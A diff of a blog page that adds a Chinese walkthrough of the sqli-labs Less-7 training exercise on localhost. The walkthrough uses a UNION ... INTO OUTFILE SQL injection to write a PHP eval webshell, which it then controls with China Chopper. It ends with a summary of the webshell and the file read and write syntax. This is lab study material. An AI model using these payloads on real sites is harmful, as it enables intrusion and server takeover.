@@ -64,6 +64,61 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql-labs-Less-7" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/02/sql-labs-Less-7/" class="article-date">
+  <time datetime="2021-02-02T03:51:02.000Z" itemprop="datePublished">2021-02-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/02/sql-labs-Less-7/">sql-labs-Less-7</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1>Less-7</h1>
+进入http://127.0.0.1/sql/Less-7，输入/?id=1',显示下面的图：
+
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/02/sql-labs-Less-7/2.png" alt="2"></p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/02/sql-labs-Less-7/1.png" alt="1"><br>说明有sql注入漏洞，但是不知道要用什么注入，看源代码知道要用<code>&#39;))</code>(?)注入<br>“use outfile”表示要用out file函数。<br>用order by查出数据有三列，然后用union操作符和outfile注入一句话木马。<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-7/?id=-1&#39;">http://127.0.0.1/sql/Less-7/?id=-1&#39;</a>))  union select 1,2,”<?php @eval($_POST['pass']);?>“ into outfile ‘E:\PhpStudy2018\PHPTutorial\WWW\sql\Less-7\text.php’–+<br>在E:\PhpStudy2018\PHPTutorial\WWW\sql\Less-7目录下生成text.php</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/blob/master/2021/02/02/sql-labs-Less-7/3.png" alt="3"></p>
+<p>然后用中国菜刀打开<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-7/text.php">http://127.0.0.1/sql/Less-7/text.php</a><br><img src="https://github.com/yzhk/yzhk.github.io/blob/master/2021/02/02/sql-labs-Less-7/4.png" alt="4"></p>
+<p>这样就拿到了这个网站的webshell。</p>
+<h1>小结</h1>
+                1.一句话木马：<?php @eval($_POST['pass']);?>（‘pass’是可以任意设置的密码）<br>
+    2.load file() 读取本地文件 select load file('要读取的文件的路径');<br>
+        //select load file('E:\\PhpStudy2018\\PHPTutorial\\WWW\\sql\\Less-7\\text.txt');<br>
+    3.into outfile 写文件 select "要写的内容" into outfile 'text.txt';(这样默认在E:\\PhpStudy2018\\PHPTutorial\\Mysql\\date下生成text.txt)<br>
+        //select "pass" into outfile 'E:\\PhpStudy2018\\PHPTutorial\\WWW\\sql\\Less-7\\text.txt' ;(在E:\\PhpStudy2018\\PHPTutorial\\WWW\\sql\\Less-7下生成text.txt文件)<br>
+
+
+
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/02/sql-labs-Less-7/" data-id="ckknvuqmx00003ouxddf84k8l" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-sql-labs-Less-5~6" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/01/27/sql-labs-Less-5~6/" class="article-date">
@@ -429,6 +484,10 @@
       <ul>
         
           <li>
+            <a href="/2021/02/20/sql-labs-Less-32~33/">sql-labs-Less-32~33</a>
+          </li>
+        
+          <li>
             <a href="/2021/02/18/sql-labs-Less-29-31/">sql-labs-Less-29~31</a>
           </li>
         
@@ -442,10 +501,6 @@
         
           <li>
             <a href="/2021/02/17/sql-labs-Less-27/">sql-labs-Less-27</a>
-          </li>
-        
-          <li>
-            <a href="/2021/02/16/sql-labs-Less-26a/">sql-labs-Less-26a</a>
           </li>
         
       </ul>
